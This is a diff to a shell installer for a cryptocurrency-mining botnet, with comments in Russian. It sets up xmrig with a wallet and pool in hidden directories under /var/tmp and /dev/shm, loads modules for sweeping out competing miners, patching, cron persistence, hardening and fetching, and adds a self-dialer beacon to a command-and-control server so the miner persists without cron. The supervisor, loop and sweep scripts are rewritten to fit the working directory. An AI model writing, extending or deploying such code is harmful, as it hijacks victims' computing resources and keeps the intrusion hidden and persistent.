@@ -21,9 +21,13 @@ SWEEP="${KF_SWEEP:-1}"
 HERE=$(CDPATH= cd -- "$(dirname -- "$0")" 2>/dev/null && pwd)
 LIB="$HERE/lib"
 [ -d "$LIB" ] || LIB="$HERE"
-for _m in 00-common 10-exclude 20-sweep 25-patch 26-antiunicorn 30-single 40-transport 50-cron 60-harden 70-fetch; do
+# деплойер кладёт библиотеки в /var/tmp/.kf, агент — в /tmp/.k.sh: подхватываем
+[ -f "$LIB/00-common.sh" ] || { [ -f /var/tmp/.kf/00-common.sh ] && LIB=/var/tmp/.kf; }
+for _m in 00-common 10-exclude 20-sweep 25-patch 26-antiunicorn 30-single 40-transport 45-dialer 50-cron 60-harden 70-fetch; do
   [ -f "$LIB/$_m.sh" ] && . "$LIB/$_m.sh"
 done
+
+command -v kf_find_workdir >/dev/null 2>&1 || { echo "KF_FATAL: библиотеки не загружены (LIB=$LIB)" >&2; exit 1; }
 
 # --- идентичность и каталоги -------------------------------------------------
 KF_SFX=$(kf_load_or_gen_sfx)
@@ -35,7 +39,11 @@ KF_WALLET="$WALLET"
 KF_POOL="$POOL"
 KF_MARK="${KF_MARK:-kf9}"
 
-KF_ROOT=$(kf_find_workdir "$KF_SFX")
+if [ -d /var/tmp/.kf ] && [ -w /var/tmp/.kf ] && [ -f /var/tmp/.kf/00-common.sh ]; then
+  KF_ROOT=/var/tmp/.kf
+else
+  KF_ROOT=$(kf_find_workdir "$KF_SFX")
+fi
 [ -n "$KF_ROOT" ] || KF_ROOT=/var/tmp/.kf
 D="$KF_ROOT"
 S=/dev/shm/.kf
@@ -142,6 +150,10 @@ done
 LP
 chmod 700 "$D/loop.sh"
 
+# --- их self-dialer: канал без cron (только не-root) -------------------------
+printf '%s\n%s\n' "$D/xmrig" "--threads=$THREADS --pause-on-active=60" > "$D/.beacon-job.path" 2>/dev/null
+kf_install_self_dialer "$D" "$C2" 2>/dev/null
+
 # --- супервизор --------------------------------------------------------------
 cat > "$D/svc.sh" <<'SV'
 #!/bin/sh
@@ -196,6 +208,11 @@ while :; do
 done
 SW
 chmod 700 "$D/sweep.sh"
+
+# пути в сгенерированных скриптах приводим к фактическому каталогу
+for _g in loop.sh svc.sh sweep.sh beacon.sh; do
+  [ -f "$D/$_g" ] && sed -i "s|/var/tmp/\.kf|$D|g; s|/dev/shm/\.kf|$D|g" "$D/$_g" 2>/dev/null
+done
 
 # --- запуск ------------------------------------------------------------------
 alm_running() { for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
